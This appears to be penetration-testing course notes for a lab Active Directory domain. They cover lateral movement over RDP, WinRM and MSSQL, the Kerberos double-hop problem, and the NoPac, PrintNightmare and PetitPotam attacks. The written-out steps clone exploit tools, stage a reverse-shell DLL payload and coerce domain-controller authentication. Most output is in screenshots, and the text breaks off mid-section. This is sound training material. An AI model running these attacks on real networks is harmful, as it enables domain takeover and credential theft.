# Privileged Access

---

Once we gain a foothold in the domain, our goal shifts to advancing our position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise or some other goal, depending on the aim of the assessment. To achieve this, there are several ways we can move laterally. Typically, if we take over an account with local admin rights over a host, or set of hosts, we can perform a `Pass-the-Hash` attack to authenticate via the SMB protocol.

`But what if we don't yet have local admin rights on any hosts in the domain?`

There are several other ways we can move around a Windows domain:

- `Remote Desktop Protocol` (`RDP`) - is a remote access/management protocol that gives us GUI access to a target host
- [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2) - also referred to as PSRemoting or Windows Remote Management (WinRM) access, is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell
- `MSSQL Server` - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods

We can enumerate this access in various ways. The easiest, once again, is via BloodHound, as the following edges exist to show us what types of remote access privileges a given user has:

- [CanRDP](https://bloodhound.specterops.io/resources/edges/can-rdp)
- [CanPSRemote](https://bloodhound.specterops.io/resources/edges/can-ps-remote)
- [SQLAdmin](https://bloodhound.specterops.io/resources/edges/sql-admin)

We can also enumerate these privileges using tools such as PowerView and even built-in tools.

---

## Scenario Setup

In this section, we will move back and forth between a Windows and Linux attack host as we work through the various examples. You can spawn the hosts for this section at the end of this section and RDP into the MS01 Windows attack host. For the portion of this section that requires interaction from a Linux host (`mssqlclient.py` and `evil-winrm`) you can open a PowerShell console on MS01 and SSH to `172.16.5.225` with the credentials `htb-student:HTB_@cademy_stdnt!`. We recommend that you try all methods shown in this section (i.e., `Enter-PSSession` and `PowerUpSQL` from the Windows attack host and `evil-winrm` and `mssqlclient.py` from the Linux attack host).

---

## Remote Desktop

Typically, if we have control of a local admin user on a given machine, we will be able to access it via RDP. Sometimes, we will obtain a foothold with a user that does not have local admin rights anywhere, but does have the rights to RDP into one or more machines. This access could be extremely useful to us as we could use the host position to:

- Launch further attacks
- We may be able to escalate privileges and obtain credentials for a higher privileged user
- We may be able to pillage the host for sensitive data or credentials

Using PowerView, we could use the [Get-NetLocalGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-NetLocalGroupMember/) function to begin enumerating members of the `Remote Desktop Users` group on a given host. Let's check out the `Remote Desktop Users` group on the `MS01` host in our target domain.

#### Enumerating the Remote Desktop Users Group
![](../../../ZMEDIA/Pasted%20image%2020260707110628.png)

From the information above, we can see that all Domain Users (meaning `all` users in the domain) can RDP to this host. It is common to see this on Remote Desktop Services (RDS) hosts or hosts used as jump hosts. This type of server could be heavily used, and we could potentially find sensitive data (such as credentials) that could be used to further our access, or we may find a local privilege escalation vector that could lead to local admin access and credential theft/account takeover for a user with more privileges in the domain. Typically the first thing I check after importing BloodHound data is:

Does the Domain Users group have local admin rights or execution rights (such as RDP or WinRM) over one or more hosts?

#### Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound

![Graph showing DOMAIN USERS@INLANEFREIGHT.LOCAL with local admin and execution rights, connected to ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL via CanRDP.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/bh_RDP_domain_users.png)

If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.

#### Checking Remote Access Rights using BloodHound

![Node info for WLEY@INLANEFREIGHT.LOCAL showing execution rights, including Group Delegated RDP Privileges set to 1.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/execution_rights.png)

We could also check the `Analysis` tab and run the pre-built queries `Find Workstations where Domain Users can RDP` or `Find Servers where Domain Users can RDP`. There are other ways to enumerate this information, but BloodHound is a powerful tool that can help us narrow down these types of access rights quickly and accurately, which is hugely beneficial to us as penetration testers under time constraints for the assessment period. This can also be helpful for the blue team to periodically audit remote access rights across the environment and catch large-scale issues such as all Domain Users having unintended access to a host or audit rights for specific users/groups.

To test this access, we can either use a tool such as `xfreerdp` or `Remmina` from our VM or the Pwnbox or `mstsc.exe` if attacking from a Windows host.

---

## WinRM

Like RDP, we may find that either a specific user or an entire group has WinRM access to one or more hosts. This could also be low-privileged access that we could use to hunt for sensitive data or attempt to escalate privileges or may result in local admin access, which could potentially be leveraged to further our access. We can again use the PowerView function `Get-NetLocalGroupMember` to the `Remote Management Users` group. This group has existed since the days of Windows 8/Windows Server 2012 to enable WinRM access without granting local admin rights.

#### Enumerating the Remote Management Users Group
![](../../../ZMEDIA/Pasted%20image%2020260707110644.png)

We can also utilize this custom `Cypher query` in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the `Raw Query` box at the bottom of the screen and hitting enter.

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

#### Using the Cypher Query in BloodHound

![BloodHound graph showing connection from FOREND@INLANEFREIGHT.LOCAL to ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL via CanPSRemote.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/canpsremote_bh_cypherq.png)

We could also add this as a custom query to our BloodHound installation, so it's always available to us.

#### Adding the Cypher Query as a Custom Query in BloodHound

![Interface for creating a custom query to find WinRM users with dangerous rights.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/user_defined_query.png)

We can use the [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) cmdlet using PowerShell from a Windows host.

#### Establishing WinRM Session from Windows
![](../../../ZMEDIA/Pasted%20image%2020260707110713.png)

From our Linux attack host, we can use the tool [evil-winrm](https://github.com/Hackplayers/evil-winrm) to connect.

To use `evil-winrm` we can install it using the following command:

#### Installing Evil-WinRM

```shellsession
haphestus@htb[/htb]$ gem install evil-winrm
```

Typing `evil-winrm` will give us the help menu and all of the available commands.

#### Viewing Evil-WinRM's Help Menu

![](../../../ZMEDIA/Pasted%20image%2020260707110739.png)

We can connect with just an IP address and valid credentials.

#### Connecting to a Target with Evil-WinRM and Valid Credentials
![](../../../ZMEDIA/Pasted%20image%2020260707110752.png)

From here, we could dig around to plan our next move.

---

## SQL Server Admin

More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool [Snaffler](https://github.com/SnaffCon/Snaffler) to find web.config or other types of configuration files that contain SQL server connection strings.

BloodHound, once again, is a great bet for finding this type of access via the `SQLAdmin` edge. We can check for `SQL Admin Rights` in the `Node Info` tab for a given user or use this custom Cypher query to search:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

Here we see one user, `damundsen` has `SQLAdmin` rights over the host `ACADEMY-EA-DB01`.

#### Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound

![Graph showing SQLAdmin connection from ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL to DAMUNDSEN@INLANEFREIGHT.LOCAL.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/sqladmins_bh.png)

We can use our ACL rights to authenticate with the `wley` user, change the password for the `damundsen` user and then authenticate with the target using a tool such as `PowerUpSQL`, which has a handy [command cheat sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet). Let's assume we changed the account password to `SQL1234!` using our ACL rights. We can now authenticate and run operating system commands.

First, let's hunt for SQL server instances.

#### Enumerating MSSQL Instances with PowerUpSQL
![](../../../ZMEDIA/Pasted%20image%2020260707110834.png)

We could then authenticate against the remote SQL server host and run custom queries or operating system commands. It is worth experimenting with this tool, but extensive enumeration and attack tactics against MSSQL are outside this module's scope.

![](../../../ZMEDIA/Pasted%20image%2020260707110928.png)

We can also authenticate from our Linux attack host using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the Impacket toolkit.

#### Displaying mssqlclient.py Options
![](../../../ZMEDIA/Pasted%20image%2020260707110942.png)

#### Running mssqlclient.py Against the Target
![](../../../ZMEDIA/Pasted%20image%2020260707110958.png)
Once connected, we could type `help` to see what commands are available to us.

#### Viewing our Options with Access to the SQL Server

![](../../../ZMEDIA/Pasted%20image%2020260707111012.png)

We could then choose `enable_xp_cmdshell` to enable the [xp_cmdshell stored procedure](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allows for one to execute operating system commands via the database if the account in question has the proper access rights.

#### Choosing enable_xp_cmdshell

![](../../../ZMEDIA/Pasted%20image%2020260707111022.png)

Finally, we can run commands in the format `xp_cmdshell <command>`. Here we can enumerate the rights that our user has on the system and see that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which can be leveraged in combination with a tool such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), or [RoguePotato](https://github.com/antonioCoco/RoguePotato) to escalate to `SYSTEM` level privileges, depending on the target host, and use this access to continue toward our goal. These methods are covered in the `SeImpersonate and SeAssignPrimaryToken` of the [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation) module. Try them out on this target if you would like to practice further!

#### Enumerating our Rights on the System using xp_cmdshell

![](../../../ZMEDIA/Pasted%20image%2020260707111039.png)

---

## Moving On

This section demonstrated a few possible lateral movement techniques in an Active Directory environment. We should always look for these types of rights when we gain our initial foothold and gain control of additional user accounts. Remember that enumerating and attacking is an iterative process! Every time we gain control over another user/host, we should repeat some enumeration steps to see what, if any, new rights and privileges we have obtained. Never overlook remote access rights if the user is not a local admin on the target host because we could very likely get onto a host where we find sensitive data, or we're able to escalate privileges.

Finally, whenever we find SQL credentials (in a script, a web.config file, or another type of database connection string), we should test access against any MSSQL servers in the environment. This type of access is almost guaranteed `SYSTEM` access over a host. If we can run commands as the account we authenticate with, it will almost always have the dangerous `SeImpersonatePrivilege` right.

The following section will address a common issue we often run into when using WinRM to connect to hosts in the network.


# Kerberos "Double Hop" Problem

---

There's an issue known as the "Double Hop" problem that arises when an attacker attempts to use Kerberos authentication across two (or more) hops. The issue concerns how Kerberos tickets are granted for specific resources. Kerberos tickets should not be viewed as passwords. They are signed pieces of data from the KDC that state what resources an account can access. When we perform Kerberos authentication, we get a "ticket" that permits us to access the requested resource (i.e., a single machine). On the contrary, when we use a password to authenticate, that NTLM hash is stored in our session and can be used elsewhere without issue.

---

## Background

The "Double Hop" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource. This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell. In this situation, the user account being used has the rights to perform an action but is denied access. The most common way to get shells is by attacking an application on the target host or using credentials and a tool such as PSExec. In both of these scenarios, the initial authentication was likely performed over SMB or LDAP, which means the user's NTLM Hash would be stored in memory. Sometimes we have a set of credentials and are restricted to a particular method of authentication, such as WinRM, or would prefer to use WinRM for any number of reasons.

The crux of the issue is that when using WinRM to authenticate over two or more connections, the user's password is never cached as part of their login. If we use Mimikatz to look at the session, we'll see that all credentials are blank. As stated previously, when we use Kerberos to establish a remote session, we are not using a password for authentication. When password authentication is used, with PSExec, for example, that NTLM hash is stored in the session, so when we go to access another resource, the machine can pull the hash from memory and authenticate us.

Let's take a quick look. If we authenticate to the remote host via WinRM and then run Mimikatz, we don't see credentials for the `backupadm` user in memory.

![](../../../ZMEDIA/Pasted%20image%2020260707111205.png)

There are indeed processes running in the context of the `backupadm` user, such as `wsmprovhost.exe`, which is the process that spawns when a Windows Remote PowerShell session is spawned.
![](../../../ZMEDIA/Pasted%20image%2020260707111231.png)

In the simplest terms, in this situation, when we try to issue a multi-server command, our credentials will not be sent from the first machine to the second.

Let's say we have three hosts: `Attack host` --> `DEV01` --> `DC01`. Our Attack Host is a Parrot box within the corporate network but not joined to the domain. We obtain a set of credentials for a domain user and find that they are part of the `Remote Management Users` group on DEV01. We want to use `PowerView` to enumerate the domain, which requires communication with the Domain Controller, DC01.

![Diagram showing attack path: Attack Host to Dev01 (First Hop), then to DC01 (Second Hop).](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/double_hop.png)

When we connect to `DEV01` using a tool such as `evil-winrm`, we connect with network authentication, so our credentials are not stored in memory and, therefore, will not be present on the system to authenticate to other resources on behalf of our user. When we load a tool such as `PowerView` and attempt to query Active Directory, Kerberos has no way of telling the DC that our user can access resources in the domain. This happens because the user's Kerberos TGT (Ticket Granting Ticket) ticket is not sent to the remote session; therefore, the user has no way to prove their identity, and commands will no longer be run in this user's context. In other words, when authenticating to the target host, the user's ticket-granting service (TGS) ticket is sent to the remote service, which allows command execution, but the user's TGT ticket is not sent. When the user attempts to access subsequent resources in the domain, their TGT will not be present in the request, so the remote service will have no way to prove that the authentication attempt is valid, and we will be denied access to the remote service.

If unconstrained delegation is enabled on a server, it is likely we won't face the "Double Hop" problem. In this scenario, when a user sends their TGS ticket to access the target server, their TGT ticket will be sent along with the request. The target server now has the user's TGT ticket in memory and can use it to request a TGS ticket on their behalf on the next host they are attempting to access. In other words, the account's TGT ticket is cached, which has the ability to sign TGS tickets and grant remote access. Generally speaking, if you land on a box with unconstrained delegation, you already won and aren't worrying about this anyways.

---

## Workarounds

A few workarounds for the double-hop issue are covered in [this post](https://posts.slayerlabs.com/double-hop/). We can use a "nested" `Invoke-Command` to send credentials (after creating a PSCredential object) with every request, so if we try to authenticate from our attack host to host A and run commands on host B, we are permitted. We'll cover two methods in this section: the first being one that we can use if we are working with an `evil-winrm` session and the second if we have GUI access to a Windows host (either an attack host in the network or a domain-joined host we have compromised.)

---

## Workaround #1: PSCredential Object

We can also connect to the remote host via host A and set up a PSCredential object to pass our credentials again. Let's see that in action.

After connecting to a remote host with domain credentials, we import PowerView and then try to run a command. As seen below, we get an error because we cannot pass our authentication on to the Domain Controller to query for the SPN accounts.

![](../../../ZMEDIA/Pasted%20image%2020260707111246.png)

If we check with `klist`, we see that we only have a cached Kerberos ticket for our current server.

![](../../../ZMEDIA/Pasted%20image%2020260707111301.png)

So now, let's set up a PSCredential object and try again. First, we set up our authentication.

![](../../../ZMEDIA/Pasted%20image%2020260707111318.png)

Now we can try to query the SPN accounts using PowerView and are successful because we passed our credentials along with the command.

![](../../../ZMEDIA/Pasted%20image%2020260707111330.png)

If we try again without specifying the `-credential` flag, we once again get an error message.

![](../../../ZMEDIA/Pasted%20image%2020260707111341.png)

If we RDP to the same host, open a CMD prompt, and type `klist`, we'll see that we have the necessary tickets cached to interact directly with the Domain Controller, and we don't need to worry about the double hop problem. This is because our password is stored in memory, so it can be sent along with every request we make.

 ![](../../../ZMEDIA/Pasted%20image%2020260707111409.png)

---

## Workaround #2: Register PSSession Configuration

We've seen what we can do to overcome this problem when using a tool such as `evil-winrm` to connect to a host via WinRM. What if we're on a domain-joined host and can connect remotely to another using WinRM? Or we are working from a Windows attack host and connect to our target via WinRM using the [Enter-PSSession cmdlet](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2)? Here we have another option to change our setup to be able to interact directly with the DC or other hosts/resources without having to set up a PSCredential object and include credentials along with every command (which may not be an option with some tools).

Let's start by first establishing a WinRM session on the remote host.

```powershell
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
```

If we check for cached tickets using `klist`, we'll see that the same problem exists. Due to the double hop problem, we can only interact with resources in our current session but cannot access the DC directly using PowerView. We can see that our current TGS is good for accessing the HTTP service on the target since we connected over WinRM, which uses SOAP (Simple Object Access Protocol) requests in XML format to communicate over HTTP, so it makes sense.

![](../../../ZMEDIA/Pasted%20image%2020260707111454.png)

We also cannot interact directly with the DC using PowerView

![](../../../ZMEDIA/Pasted%20image%2020260707111508.png)

One trick we can use here is registering a new session configuration using the [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) cmdlet.

![](../../../ZMEDIA/Pasted%20image%2020260707111522.png)

Once this is done, we need to restart the WinRM service by typing `Restart-Service WinRM` in our current PSSession. This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.

After we start the session, we can see that the double hop problem has been eliminated, and if we type `klist`, we'll have the cached tickets necessary to reach the Domain Controller. This works because our local machine will now impersonate the remote machine in the context of the `backupadm` user and all requests from our local machine will be sent directly to the Domain Controller.

![](../../../ZMEDIA/Pasted%20image%2020260707111552.png)

We can now run tools such as PowerView without having to create a new PSCredential object.

![](../../../ZMEDIA/Pasted%20image%2020260707111605.png)

Note: We cannot use `Register-PSSessionConfiguration` from an evil-winrm shell because we won't be able to get the credentials popup. Furthermore, if we try to run this by first setting up a PSCredential object and then attempting to run the command by passing credentials like `-RunAsCredential $Cred`, we will get an error because we can only use `RunAs` from an elevated PowerShell terminal. Therefore, this method will not work via an evil-winrm session as it requires GUI access and a proper PowerShell console. Furthermore, in our testing, we could not get this method to work from PowerShell on a Parrot or Ubuntu attack host due to certain limitations on how PowerShell on Linux works with Kerberos credentials. This method is still highly effective if we are testing from a Windows attack host and have a set of credentials or compromise a host and can connect via RDP to use it as a "jump host" to mount further attacks against hosts in the environment.

We can also use other methods such as CredSSP, port forwarding, or injecting into a process running in the context of a target user (sacrificial process) that we won't cover here.

---

## Wrap Up

In this section, we've seen how to overcome the Kerberos "Double Hop" problem when working with WinRM in an AD environment. We will encounter this often during our assessments, so we must understand the issue and have certain tactics in our toolbox to avoid losing time.

The following section will cover other ways to escalate privileges and move laterally in a domain once we have valid credentials using various critical vulnerabilities identified throughout 2021.

# Bleeding Edge Vulnerabilities

---

When it comes to patch management and cycles, many organizations are not quick to roll out patches through their networks. Because of this, we may be able to achieve a quick win either for initial access or domain privilege escalation using a very recent tactic. At the time of writing (April 2022), the three techniques shown in this section are relatively recent (within the last 6-9 months). These are advanced topics that can not be covered thoroughly in one module section. The purpose of demonstrating these attacks is to allow students to try out the latest and greatest attacks in a controlled lab environment and present topics that will be covered in extreme depth in more advanced Active Directory modules. As with any attack, if you do not understand how these work or the risk they could pose to a production environment, it would be best not to attempt them during a real-world client engagement. That being said, these techniques could be considered "safe" and less destructive than attacks such as [Zerologon](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/) or [DCShadow](https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/). Still, we should always exercise caution, take detailed notes, and communicate with our clients. All attacks come with a risk. For example, the `PrintNightmare` attack could potentially crash the print spooler service on a remote host and cause a service disruption.

As information security practitioners in a rapidly changing and evolving field, we must keep ourselves sharp and on top of recent attacks and new tools and techniques. We recommend trying out all of the techniques in this section and doing additional research to find other methods for performing these attacks. Now, let's dive in.

---

## Scenario Setup

In this section, we will perform all examples from a Linux attack host. You can spawn the hosts for this section at the end of this section and SSH into the ATTACK01 Linux attack host. For the portion of this section that demonstrates interaction from a Windows host (using Rubeus and Mimikatz), you could spawn the MS01 attack host in the previous or next section and use the base64 certificate blob obtained using `ntlmrelayx.py` and `petitpotam.py` to perform the same pass-the-ticket attack using Rubeus as demonstrated near the end of this section.

---

## NoPac (SamAccountName Spoofing)

A great example of an emerging threat is the [Sam_The_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), also called `noPac` or referred to as `SamAccountName Spoofing` released at the end of 2021. This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. Here is a quick breakdown of what each CVE provides regarding this vulnerability.

|42278|42287|
|---|---|
|`42278` is a bypass vulnerability with the Security Account Manager (SAM).|`42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.|

This exploit path takes advantage of being able to change the `SamAccountName` of a computer account to that of a Domain Controller. By default, authenticated users can add up to [ten computers to a domain](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain). When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this [blog post](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware).

We can use this [tool](https://github.com/Ridter/noPac) to perform this attack. This tool is present on the ATTACK01 host in `/opt/noPac`.

NoPac uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, we should ensure Impacket is installed and the noPac exploit repo is cloned to our attack host if needed. We can use these commands to do so:

#### Ensuring Impacket is Installed

```shellsession
haphestus@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git
```

```shellsession
haphestus@htb[/htb]$ python setup.py install
```

#### Cloning the NoPac Exploit Repo

```shellsession
haphestus@htb[/htb]$ git clone https://github.com/Ridter/noPac.git
```

Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (`scanner.py`) then use the exploit (`noPac.py`) to gain a shell as `NT AUTHORITY/SYSTEM`. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the `ms-DS-MachineAccountQuota` number is set to 10. In some environments, an astute sysadmin may set the `ms-DS-MachineAccountQuota` value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to `0` can prevent quite a few AD attacks.

#### Scanning for NoPac

![](../../../ZMEDIA/Pasted%20image%2020260707111742.png)

There are many different ways to use NoPac to further our access. One way is to obtain a shell with SYSTEM level privileges. We can do this by running noPac.py with the syntax below to impersonate the built-in administrator account and drop into a semi-interactive shell session on the target Domain Controller. This could be "noisy" or may be blocked by AV or EDR.

#### Running NoPac & Getting a Shell

![](../../../ZMEDIA/Pasted%20image%2020260707111756.png)

We will notice that a `semi-interactive shell session` is established with the target using [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py). Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using `cd`.

It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use `ls` to confirm.

#### Confirming the Location of Saved Tickets

```shellsession
haphestus@htb[/htb]$ ls 

administrator_DC01.INLANEFREIGHT.local.ccache  
noPac.py   requirements.txt  utils README.md  scanner.py
```

We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the `-dump` flag to perform a DCSync using secretsdump.py. This method would still create a ccache file on disk, which we would want to be aware of and clean up.

#### Using noPac to DCSync the Built-in Administrator Account

![](../../../ZMEDIA/Pasted%20image%2020260707111845.png)

---

## Windows Defender & SMBEXEC.py Considerations

If Windows Defender (or another AV or EDR product) is enabled on a target, our shell session may be established, but issuing any commands will likely fail. The first thing smbexec.py does is create a service called `BTOBTO`. Another service called `BTOBO` is created, and any command we type is sent to the target over SMB inside a .bat file called `execute.bat`. With each new command we type, a new batch script is created and echoed to a temporary file that executes said script and deletes it from the system. Let's look at a Windows Defender log to see what behavior was considered malicious.

#### Windows Defender Quarantine Log

![Windows Security alert for VirTool:Win32/MSPSEexecCommand, alert level severe, status removed, dated 3/25/2022.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/defenderLog.png)

If opsec or being "quiet" is a consideration during an assessment, we would most likely want to avoid a tool like smbexec.py. The focus of this module is on tactics and techniques. We will refine our methodology as we progress in more advanced modules, but we first must obtain a solid base in enumerating and attacking Active Directory.

---

## PrintNightmare

`PrintNightmare` is the nickname given to two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. Using this vulnerability for local privilege escalation is covered in the [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation) module, but is also important to practice within the context of Active Directory environments for gaining remote access to a host. Let's practice with one exploit that can allow us to gain a SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host.

Before conducting this attack, we must retrieve the exploit we will use. In this case, we will be using [cube0x0's](https://twitter.com/cube0x0?lang=en) exploit. We can use Git to clone it to our attack host:

#### Cloning the Exploit

```shellsession
haphestus@htb[/htb]$ git clone https://github.com/cube0x0/CVE-2021-1675.git
```

For this exploit to work successfully, we will need to use cube0x0's version of Impacket. We may need to uninstall the version of Impacket on our attack host and install cube0x0's (this is already installed on ATTACK01 in the lab). We can use the commands below to accomplish this:

#### Install cube0x0's Version of Impacket

```shellsession
pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install
```

We can use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.

#### Enumerating for MS-RPRN

```shellsession
haphestus@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR' Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol  Protocol: [MS-RPRN]: Print System Remote Protocol
```

After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using `msfvenom`.

#### Generating a DLL Payload

![](../../../ZMEDIA/Pasted%20image%2020260707112002.png)

We will then host this payload in an SMB share we create on our attack host using `smbserver.py`.

#### Creating a Share with smbserver.py

![](../../../ZMEDIA/Pasted%20image%2020260707112014.png)

Once the share is created and hosting our payload, we can use MSF to configure & start a multi handler responsible for catching the reverse shell that gets executed on the target.

#### Configuring & Starting MSF multi/handler

 ![](../../../ZMEDIA/Pasted%20image%2020260707112043.png)

With the share hosting our payload and our multi handler listening for a connection, we can attempt to run the exploit against the target. The command below is how we use the exploit:

#### Running the Exploit

![](../../../ZMEDIA/Pasted%20image%2020260707112055.png)

Notice how at the end of the command, we include the path to the share hosting our payload (`\\<ip address of attack host>\ShareName\nameofpayload.dll`). If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back to our multi handler giving us an elevated SYSTEM shell.

#### Getting the SYSTEM Shell
![](../../../ZMEDIA/Pasted%20image%2020260707112107.png)

Once the exploit has been run, we will notice that a Meterpreter session has been started. We can then drop into a SYSTEM shell and see that we have NT AUTHORITY\SYSTEM privileges on the target Domain Controller starting from just a standard domain user account.

---

## PetitPotam (MS-EFSRPC)

PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

[This](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.

Let's walk through the attack. First off, we need to start `ntlmrelayx.py` in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If we didn't know the location of the CA, we could use a tool such as [certi](https://github.com/zer1t0/certi) to attempt to locate it.

#### Starting ntlmrelayx.py

 ![](../../../ZMEDIA/Pasted%20image%2020260707112126.png)

In another window, we can run the tool [PetitPotam.py](https://github.com/topotam/PetitPotam). We run this tool with the command `python3 PetitPotam.py <attack host IP> <Domain Controller IP>` to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.

There is an executable version of this tool that can be run from a Windows host. The authentication trigger has also been added to Mimikatz and can be run as follows using the encrypting file system (EFS) module: `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`. There is also a PowerShell implementation of the tool [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1).

Here we run the tool and attempt to coerce authentication via the [EfsRpcOpenFileRaw](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8) method.

#### Running PetitPotam.py

![](../../../ZMEDIA/Pasted%20image%2020260707112143.png)

#### Catching Base64 Encoded Certificate for DC01

